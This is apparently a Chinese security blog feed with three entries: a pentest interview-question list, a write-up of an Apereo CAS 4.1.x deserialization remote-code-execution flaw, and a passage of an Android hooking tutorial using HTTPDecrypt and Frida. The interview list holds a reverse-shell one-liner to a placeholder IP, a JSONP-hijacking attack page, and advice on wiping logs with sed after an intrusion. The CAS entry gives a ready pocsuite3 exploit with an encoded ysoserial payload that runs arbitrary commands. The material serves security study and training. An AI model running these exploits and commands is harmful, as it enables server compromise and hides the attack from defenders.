WEB 开发 JAVA 框架</p><p>STRUTS,SPRING 常⻅的 java 框架漏洞 其实⾯试官问这个问题的时候我不太清楚他要问什么，我提到 struts 的 045048，java 常⻅反序列化。045 错误处理引⼊了 ognl 表达式 048 封装 action 的过程中有⼀步调⽤ getstackvalue 递归 </p><p>获取 ognl 表达式 反序列化 操作对象，通过⼿段引⼊。apache common 的反射机制、readobject 的重写，其实具体的 </p><p>我也记不清楚。。。然后这部分就结束了 </p><p>同源策略 </p><p>同源策略限制不同源对当前 document 的属性内容进⾏读取或设置。不同源的区分：协议、域名、⼦域名、IP、端⼝， </p><p>以上有不同时即不同源。 </p><p>Jsonp 安全攻防技术，怎么写 Jsonp 的攻击⻚⾯</p><p>涉及到 Jsonp 的安全攻防内容 </p><p>JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。 </p><p>攻击⻚⾯</p><p>JSON 劫持，跨域劫持敏感信息，⻚⾯类似于</p><p>function wooyun(v){</p><p>alert(v.username);</p><p>}</p><p> </p><script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script> <p>Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利⽤参照知道 </p><p>创宇的 JSONP 安全攻防技术。 </p><p>2、PHP </p><p>php 中命令执⾏涉及到的函数 </p><p>代码执⾏：eval()、assert()、popen()、system()、exec()、shell_exec()、 </p><p>passthru(),pcntl_exec(),call_user_func_array(),create_function()⽂件读取：fifile_get_contents(),highlight_fifile(),fopen(),read fifile(),fread(),fgetss(), </p><p>fgets(),parse_ini_fifile(),show_source(),fifile() 等 </p><p>命令执⾏：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() </p><p>安全模式下绕过 php 的 disable fuction </p><p>DL 函数，组件漏洞，环境变量。 </p><p>PHP 弱类型</p><p>== 在进⾏⽐较的时候，会先将字符串类型转化成相同，再⽐较 </p><p>如果⽐较⼀个数字和字符串或者⽐较涉及到数字内容的字符串，则字符串会被转换成数值并且⽐较按照数值来进⾏</p><p>0e 开头的字符串等于 0 </p><p>3、数据库 </p><p>各种数据库⽂件存放的位置 </p><p>mysql:</p><p>/usr/local/mysql/data/</p><p>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</p><p>oracle: $ORACLE_BASE/oradata/$ORACLE_SID/</p><p>4、系统</p><p>如何清理⽇志如何清理⽇志 </p><p>meterpreter: clearev</p><p>⼊侵 Linux 服务器后需要清除哪些⽇志？ </p><p>web ⽇志，如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除 </p><p>e.g. sed -i -e ‘/192.169.1.1/d’ </p><p>history 命令的清除，也是对~/.bash_history 进⾏定向清除 </p><p>wtmp ⽇志的清除，/var/log/wtmp </p><p>登录⽇志清除 /var/log/secure </p><p>LINUX </p><p>查看当前端⼝连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</p><p>netstat -antp<code></code>ss -l</p><p>ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，⽽且⽐ netstat 更快速更⾼效。 </p><p>反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么?</p><p>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</p><p>通过 Linux 系统的 / proc ⽬录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？</p><p>ls /proc</p><p>系统信息，硬件信息，内核版本，加载的模块，进程 </p><p>linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性。</p><p>/etc/ssh/sshd config iptables 配置/etc/ssh/sshd___config iptables 配置 </p><p>如何⼀条命令查看⽂件内容最后⼀百⾏</p><p>tail -n 100 filename</p><p>Windows </p><p>如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路。 </p><p>5、密码学 </p><p>AES／DES 的具体⼯作步骤 </p><p>RSA 算法 </p><p>加密: </p><p>密⽂＝明⽂ ^EmodN </p><p>RSA 加密是对明⽂的 E 次⽅后除以 N 后求余数的过程 </p><p>公钥＝(E,N) </p><p>解密: </p><p>明⽂＝密⽂ ^DmodN 私钥＝(D,N)</p><p>三个参数 n,e1,e2 </p><p>n 是两个⼤质数 p,q 的积 </p><p>分组密码的加密模式 </p><p>如何⽣成⼀个安全的随机数？ </p><p>引⽤之前⼀个学⻓的答案，可以通过⼀些物理系统⽣成随机数，如电压的波动、磁盘磁头读 / 写时的寻道时间、空中电磁波的噪声等。 </p><p>SSL 握⼿过程 </p><p>建⽴ TCP 连接、客户端发送 SSL 请求、服务端处理 SSL 请求、客户端发送公共密钥加密过的随机数据、服务端⽤私有 </p><p>密钥解密加密后的随机数据并协商暗号、服务端跟客户端利⽤暗号⽣成加密算法跟密钥 key、之后正常通信。这部分本</p><p>来是忘了的，但是之前看 SSL Pinning 的时候好像记了张图在脑⼦⾥，挣扎半天还是没敢确定，遂放弃。。。</p><p>对称加密与⾮对称加密的不同，分别⽤在哪些⽅⾯ </p><p>6、TCP/IP</p><p>TCP 三次握⼿的过程以及对应的状态转换 </p><p>（1）客户端向服务器端发送⼀个 SYN 包，包含客户端使⽤的端⼝号和初始序列号 x; </p><p>（2）服务器端收到客户端发送来的 SYN 包后，向客户端发送⼀个 SYN 和 ACK 都置位的 TCP 报⽂，包含确认号 xx1 </p><p>和服务器端的初始序列号 y; </p><p>（3）客户端收到服务器端返回的 SYNSACK 报⽂后，向服务器端返回⼀个确认号为 yy1、序号为 xx1 的 ACK 报⽂，⼀</p><p>个标准的 TCP 连接完成。 </p><p>TCP 和 UDP 协议区别 </p><p>tcp ⾯向连接, udp ⾯向报⽂ tcp 对系统资源的要求多 udp 结构简单 tcp 保证数据完整性和顺序，udp 不保证 </p><p>https 的建⽴过程 </p><p>a、客户端发送请求到服务器端 </p><p>b、服务器端返回证书和公开密钥，公开密钥作为证书的⼀部分⽽存在 </p><p>c、客户端验证证书和公开密钥的有效性，如果有效，则⽣成共享密钥并使⽤公开密钥加密发送到服务器端 </p><p>d、服务器端使⽤私有密钥解密数据，并使⽤收到的共享密钥加密数据，发送到客户端 </p><p>e、客户端使⽤共享密钥解密数据</p><p>f SSL 加密建⽴f、SSL 加密建⽴ </p><p>7、流量分析 </p><p>wireshark 简单的过滤规则 </p><p>过滤 ip: </p><p>过滤源 ip 地址: ip.src==1.1.1.1; , ⽬的 ip 地址: ip.dst==1.1.1.1;</p><p>过滤端⼝: </p><p>过滤 80 端⼝: tcp.port==80 , 源端⼝: tcp.srcport==80 , ⽬的端⼝: tcp.dstport==80</p><p>协议过滤: </p><p>直接输⼊协议名即可, 如 http 协议 http</p><p>http 模式过滤: </p><p>过滤 get/post 包 http.request.mothod==”GET/POST”</p><p>8、防⽕墙 </p><p>简述路由器交换机、防⽕墙等⽹络设备常⽤的⼏个基础配置加固项，以及配置⽅法。</p><p>转自：</p><p><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;渗透篇&quot;&gt;&lt;a href=&quot;#渗透篇&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="面试" scheme="http://www.ol4three.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Apereo Cas 4.1.x 反序列化命令执行漏洞</title>
    <link href="http://www.ol4three.com/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-12-29T11:34:42.000Z</published>
    <updated>2020-12-30T03:19:03.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote><p>Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其实这个洞在2016年时候就出来了，Apereo Cas一般是用来做身份认证的，所以有一定的攻击面，漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用。</p><p>漏洞原理实际上是 Webflow 中使用了默认密钥 <code>changeit</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>工具下载地址：</p><p><a href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p><p>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonCollections4</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229195402286.png" alt="image-20201229195402286"></p><p>将该payload替换至execution处，并在头部添加命令cmd:xxx</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229203354148.png" alt="image-20201229203354148"></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class ApereoPoc(POCBase):</span><br><span class="line">vulID &#x3D; &#39;004&#39;</span><br><span class="line">version &#x3D; &#39;1.0&#39;</span><br><span class="line">author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">vulDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">updateDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">references &#x3D; [&#39;https:&#x2F;&#x2F;github.com&#x2F;MrMeizhi&#x2F;ysoserial-mangguogan&#39;]</span><br><span class="line">name &#x3D; &#39;appereo 4.1rce&#39;</span><br><span class="line">appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.appareo.com&#x2F;&#39;</span><br><span class="line">appName &#x3D; &#39;Appereo&#39;</span><br><span class="line">appVersion &#x3D; &#39;4.1&#39;</span><br><span class="line">vulType &#x3D; &#39;rce&#39;</span><br><span class="line">desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> rce</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">samples &#x3D; []</span><br><span class="line">install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _options(self):</span><br><span class="line">o &#x3D; OrderedDict()</span><br><span class="line">o[&quot;exec&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;请输入想要执行的命令&#39;, require&#x3D;True)</span><br><span class="line">return o</span><br><span class="line"></span><br><span class="line">def _verify(self):</span><br><span class="line">result &#x3D; &#123;&#125;</span><br><span class="line">payload &#x3D; self.get_option(&quot;exec&quot;)</span><br><span class="line">url &#x3D; self.url + &#39;&#x2F;cas&#x2F;login&#39;</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">&#39;Content-Type&#39;:  &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">&#39;cmd&#39;: payload</span><br><span class="line">&#125;</span><br><span class="line">#proxies&#x3D;&#123;</span><br><span class="line"># &#39;http&#39;:&#39;127.0.0.1:8081&#39;,</span><br><span class="line"># &#39;https&#39;:&#39;127.0.0.1:8081&#39;</span><br><span class="line"># &#125;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">&#39;execution&#39;:&#39;4c2e04cc-36fd-4a78-a539-ab98a65ff427_AAAAIgAAABC0ugdUC3wVTL66CTpSSFXfAAAABmFlczEyOCCbvgOC7&#x2F;mJ16k1YEqnbb4iYkkhNuWylo+cCiG7vsHQWc4OudDgqLtgaCEzQj8c&#x2F;3tWkVDKryIJFcjdW64IpJ1+ymxDamhIfoF3oCFkBD6LGjmB31YH6zlT1rFN9&#x2F;7CFeKORHALeLVx2YAN4seko9M&#x2F;javUOs7UE+zzLGonjc54xjK7S64KBw52Fa0vj912zrOP4J6S7Vi9yJOeOTx432Or&#x2F;cjz722nEAIpjpcIIawwRdUcCyZY7bJDhR+QL7Ca3h9lPZ1LIAeIe9CDP0PCQDAONZ0rswQ9AitIDlqM+lBDKtqhPfHSNq8jBd5T6t3&#x2F;9xXFpPIbLpUPiwysE&#x2F;yioU8b&#x2F;npQfATy5UZvf3d2TWtHiEEhECGjOS4zZqqhl5HhBK3lw50JoO&#x2F;78RMscuM+3oAF8r9YJq2vrY+2GNwgg5rMIWtodeQL9gEIABKMy2Isetinvnc05Dj5f9kJ7WXSIrEobqYmSf1RaSM7EO8yuXS7kVUvY1+TYBorC8JYhY6owsUm4jNSKlvVX+PkrwcQXOJH3lpVpN4qZ&#x2F;GTNJkNO0ndWRlWgoHDKxI0+Jr6+k2CzlPgOhCiQq08nldByD4VOFJ1Fcjj4XFxlWI2MWxsMYTj9YdHwozA4gZNE8gkMq0tn8lwnJz6gVvSXWkDKnxJBPT3kEw1b+wjZSBsuj+JCdxCIa+lZopdPWIO40ITA2245p1U9i9srkCJ&#x2F;od122lzrrCALs+FKn1&#x2F;uwQs9FKXxH8xKwgpUmZepCX6Lf+qr8m9xQ&#x2F;XmoxSh1Sg0hkZcw0bh30mdZvUH9Jf&#x2F;bEdgVxuAB1Ki1Y5&#x2F;flDS4HkjydACMm+Pg5SzcRHZtavv+t5ko&#x2F;tTIjwyqug9jOZWMnKDq47nD&#x2F;qOvuO0TS&#x2F;COeDMmPGV4stx6+5+6kXtP088MQVRBLdlVsGrolnPVgQG9JPgfMOZKoyidBDH99oy1WWivT2Y2LDnFx4MXeuEHR3qnuWHkYxfaysVCM83yMd4eqvLBHp4ILBf4mmv34S25T7ajkOKfIDXJZc7AhzlkfPzufCSIVdYNPvRxijLpJV2icYs7KQXx98EXXwOAw+wXJAKEbEXv&#x2F;gErjwUQUXVactxFVqlkugxj1u052N9gh620Nz+54c5FF8vHaBtHVNtB48bnB1NGCL098EDHFnI9L&#x2F;trqp2LPw6veXtH0y6TT&#x2F;l+sALyQ6P167qrc6lQ8gclh5tEg4Cuz2jbG56pmY+5Zj6RHNFeZeDDXpYrJ5g2Bxn4AcPW3lM4Vpnzoypzcs4ktZRL0deQNMis53i5O0C96ZBQjYqfPqCtr7zS7KZXRfJSmmv0hcWZINv0S2+7SzFCrRyMW0ykJ4reuwlm1ZAG2W5RZNzMOH&#x2F;76N2ITAQxFHG228typOvHAuXG2pB5xYMwtm9ZysqQvzGNMspuu0CaDkCV7myKMAtCfGJTVRV7xs1slSmYnwTg3SdoJ+0ZJfOOsyFsZYqii2RTixQKykc4Uo3fyLb9dFe6Kd7vpkK&#x2F;47MrOmzVBS1Xv1cHGCeM7K4Yca0&#x2F;oJL&#x2F;Dhbwfqt4hIKbhiTccek5mco&#x2F;hywqizyY2C3UVieQxOX1CYfrjnihEJ75lBQjkaRqB3S05vzzfyTPvv55QfYQMyMODdgvNEt9PIQ6axHv1DxYeVhUAd10p1n01SQIdbAi+1WE3ykGgyrLSul1gFRlI&#x2F;3STqelXFWbYiZarKdfgvvV1r&#x2F;HQ6ZErUagAdmmaJUSgjzRSEgA3Sk&#x2F;V5PMrISxxYVbTVm&#x2F;vq1Zla7BaUstxiclygOuvZ3C2AfxS+AVaTeqOWCqXrjeg6uxOJIUQ1HzS&#x2F;Vs5EbYmkcRHWCjJRTjh&#x2F;Sa0GDP&#x2F;Giuw5CL8BEDo7SKuYqVYOIf5hk0Upj4YcRWouOhbbJY9mNNWHknoiYRJHTrVDrRwYYO1Ij8Vf8jiWmXxRWZ8tyFuEB3yX0SkVgw5OlU1M24d7x1LZYpZX6vpU1qrDme1yrGW4FS4qBg3lE1r9EK2gzQeT1u5GhME2rotGVNU4OZ&#x2F;Ut3mKpY5NOo3b2yHoa1iIdE+Sg9uerfNPV59u00En&#x2F;I2MHTtl8JGZp3SXTtoxG8YBC4CU7JXdSzmSF8nHD0SGUL&#x2F;LNdajIzH9hfijUX6I5NxEMyumX&#x2F;krUBqW0irEWYV7I60YDRzN&#x2F;LpXe9EQj5chLmXlRcQU49vlxSHav3YFHrnGFFzyGxwU&#x2F;6RDiWIt4ombAl&#x2F;&#x2F;OsWR964unMMsU+omndBNBII&#x2F;1g1kSs1qikjqdNm611p8swjK3X7kpGCj5rUyTE9GOAkBD6NYrj32SNE5BPys7u6r3Q7gx&#x2F;hU1s02trClHoQhqQvKILW8dN7aYcWSf5FV8fug3GjAxV+c3pTYiNbe2lKFLbzyeJen1GvkAVXVrpJqtuPejZK6IPiJ8wI7ZwqL7oP5G3Esu9Z6syxrdqMGmhpOA0QE0NPISgMu6TzZxgt3FGAkV9&#x2F;hH9ABc&#x2F;h4QMMkUOgZPMddyYBugpcaG0NTgU7WXZNuz1hQEqsW+rcXVhF30uydTnF2mhJ0UrmQVMg+qlaGBQOVJuar9ud+D+CAYT2a2tjUluhWj284EjM5yNg3A5nNQthCowUy7bfsjbp82Yb8p9l86ETHZo26WmUe2k+beZPGOtF00QZcQaRYowr2B8+0OMFuhmGzWtJqlWgGXAmtcWFPyDgnHWwjj&#x2F;bTyqzVfnrBpiKf1SiUdRbrvyr8hjrWQ&#x2F;wZ52No1qkQmLo1x9sfEcBKHOxakYWb6vjbcPQekorRn4NS4WT3KU&#x2F;ftAhxg2EITy2Lq1Y&#x3D;&#39;</span><br><span class="line">&#125;</span><br><span class="line">r &#x3D; requests.post(url, headers&#x3D;headers,data&#x3D;data)</span><br><span class="line">if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;exec&#39;] &#x3D; r.text</span><br><span class="line">return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line"> output &#x3D; Output(self)</span><br><span class="line"> if result:</span><br><span class="line"> output.success(result)</span><br><span class="line"> else:</span><br><span class="line"> output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> return output</span><br><span class="line"></span><br><span class="line">def _attack(self):</span><br><span class="line">return self._verify()</span><br><span class="line">register_poc(ApereoPoc)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229210459731.png" alt="image-20201229210459731"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8260#toc-4">https://xz.aliyun.com/t/8260#toc-4</a></p><p><a href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apereo Cas" scheme="http://www.ol4three.com/tags/Apereo-Cas/"/>
    
  </entry>
  
  <entry>
    <title>使用Httpdecrypt进行hook</title>
    <link href="http://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/"/>
    <id>http://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/</id>
    <published>2020-12-29T03:57:33.000Z</published>
    <updated>2020-12-29T08:13:26.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.mumu模拟器</span><br><span class="line">2.httpdecrypt（https:&#x2F;&#x2F;github.com&#x2F;lyxhh&#x2F;lxhToolHTTPDecrypt）</span><br><span class="line">3.frida 12.11.17</span><br><span class="line">4.Mac os 10.15.5</span><br></pre></td></tr></table></figure><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="1-使用mumu模拟器连接adb"><a href="#1-使用mumu模拟器连接adb" class="headerlink" title="1. 使用mumu模拟器连接adb"></a>1. 使用mumu模拟器连接adb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb kill-server &amp;&amp; adb server &amp;&amp; adb shell</span><br></pre></td></tr></table></figure><p>安装时使用4.3.2版本 5.0版本报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The client is using an unsupported version of the Socket.IO or Engine.IO protocols</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-socketio&#x3D;&#x3D;4.3.2</span><br></pre></td></tr></table></figure><h3 id="2-对注册功能抓包"><a href="#2-对注册功能抓包" class="headerlink" title="2. 对注册功能抓包"></a>2. 对注册功能抓包</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120510857.png" alt="image-20201229120510857"></p><p>可以看到securityCode以及post内容均为加密内容</p><h3 id="3-运行httpdecrypt"><a href="#3-运行httpdecrypt" class="headerlink" title="3. 运行httpdecrypt"></a>3. 运行httpdecrypt</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120648649.png" alt="image-20201229120648649"></p><p>找到目标app 将app包名com.xxx.xxx填入框中并点击Confirm</p><h3 id="4-然后点击Hooks功能"><a href="#4-然后点击Hooks功能" class="headerlink" title="4. 然后点击Hooks功能"></a>4. 然后点击Hooks功能</h3><p>在Match中输入刚才的包名 点击Confirm</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121019274.png" alt="image-20201229121019274"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121218308.png" alt="image-20201229121218308"></p><h3 id="5-重新进行注册功能操作"><a href="#5-重新进行注册功能操作" class="headerlink" title="5. 重新进行注册功能操作"></a>5. 重新进行注册功能操作</h3><p>根据数据包中的参数，找到对应的方法</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145006899.png" alt="image-20201229145006899"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145315814.png" alt="image-20201229145315814"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool.EncoderByMd5(argType0 : string)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145518763.png" alt="image-20201229145518763"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.decrypt(argType0 : object argType1 : string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-查看加密函数"><a href="#6-查看加密函数" class="headerlink" title="6. 查看加密函数"></a>6. 查看加密函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure><p>有两个参数 一个是<strong>对象</strong> 一个是<strong>字符串</strong> 我们还需要知道对象的具体的参数类型</p><p>在Finds中搜索函数的类名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool</span><br></pre></td></tr></table></figure><ul><li>点击Confirm</li><li>找到方法名EncryptionTool$AES encrypt</li><li>可以看到其具体的参数类型</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145750559.png" alt="image-20201229145750559"></p><p>加密函数中参数对象的具体的类型为static</p><h2 id="代码生成"><a href="#代码生成" class="headerlink" title="代码生成"></a>代码生成</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145856477.png" alt="image-20201229145856477" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.转到toBurp模块</span><br><span class="line">2.然后点击Confirm</span><br><span class="line">3.点击add</span><br><span class="line">由于这个加密函数有两个参数 所以需要自己编辑代码（默认只有一个参数）</span><br><span class="line">4.由于对象参数是static类型 所以选择static类型</span><br><span class="line">动态的选择instance类型</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150310913.png" alt="image-20201229150310913"></p><h3 id="1-在custom中会生成代码"><a href="#1-在custom中会生成代码" class="headerlink" title="1. 在custom中会生成代码"></a>1. 在custom中会生成代码</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229153322897.png" alt="image-20201229153322897"></p><p>arg0是传过来的加密字符串 